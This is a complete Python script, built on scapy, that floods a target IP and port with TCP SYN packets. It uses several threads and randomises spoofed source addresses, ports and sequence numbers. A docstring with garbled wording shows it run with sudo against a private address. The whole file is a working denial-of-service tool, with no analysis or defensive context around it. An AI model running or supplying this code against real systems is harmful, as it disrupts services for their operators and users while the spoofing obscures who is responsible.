#!/usr/bin/env python3
"""

SYN-Flood multithread ip/port spoofed and for configuring the tas
proving:
    sudo -E python3 SYN_flood.py 10.12.0.10 80 -t 4 -r 500
"""
import argparse, os, random, threading, time
from scapy.all import IP, TCP, send, conf
conf.verb = 0

def syn_spam(dst_ip, dst_port, pps):
    delay = 1 / pps
    while True:
        ip  = IP(src=f"{random.randint(1,254)}.{random.randint(0,255)}."
                     f"{random.randint(0,255)}.{random.randint(1,254)}",
                 dst=dst_ip, ttl=random.randint(32,255))
        tcp = TCP(sport=random.randint(1024,65535), dport=dst_port,
                  seq=random.randint(0,2**32-1), flags='S',
                  window=random.randint(1024, 65535))
        send(ip/tcp, iface=ARGS.iface, fast=True)
        time.sleep(delay)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('target_ip')
    parser.add_argument('target_port', type=int)
    parser.add_argument('-t', '--threads', type=int, default=2, help='Paralels threads')
    parser.add_argument('-r', '--rate', type=float, default=200, help='Packets second per thread')
    parser.add_argument('-i', '--iface', default=None)
    ARGS = parser.parse_args()

    print(f"[+] SYN‑Flood a {ARGS.target_ip}:{ARGS.target_port}  "
          f"({ARGS.threads} threads × {ARGS.rate} pps)")
    for _ in range(ARGS.threads):
        threading.Thread(target=syn_spam,
                         args=(ARGS.target_ip, ARGS.target_port, ARGS.rate),
                         daemon=True).start()
    print("[*] Ctrl‑C for stop")
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        pass
